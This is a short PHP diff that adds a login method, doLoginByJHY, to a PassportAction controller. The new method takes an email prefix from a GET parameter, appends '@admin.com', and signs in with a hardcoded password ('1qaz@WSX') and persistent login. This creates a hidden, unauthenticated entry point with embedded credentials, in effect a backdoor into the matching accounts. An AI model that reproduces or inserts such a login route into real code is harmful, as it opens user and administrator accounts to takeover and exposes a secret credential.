@@ -95,6 +95,25 @@ class PassportAction extends Action
 		$this->ajaxReturn($data,$info,$status);
 	}	
 	
+    public function doLoginByJHY() {
+		$login 		= t($_GET['login_email'])."@admin.com";
+		$password 	= "1qaz@WSX";
+		$remember	= 1;
+		
+		$result 	= $this->passport->loginLocal($login,$password,$remember);
+		if(!$result){
+			$status = 0; 
+			$info	= $this->passport->getError();
+			$data 	= 0;
+		}else{
+			$status = 1;
+			$info 	= $this->passport->getSuccess();
+			$data 	= ($GLOBALS['ts']['site']['home_url'])?$GLOBALS['ts']['site']['home_url']:0;
+			//$data 	= 0;
+		}
+		$this->ajaxReturn($data,$info,$status);
+	}
+    
 	/**
 	 * 注销登录
 	 * @return void
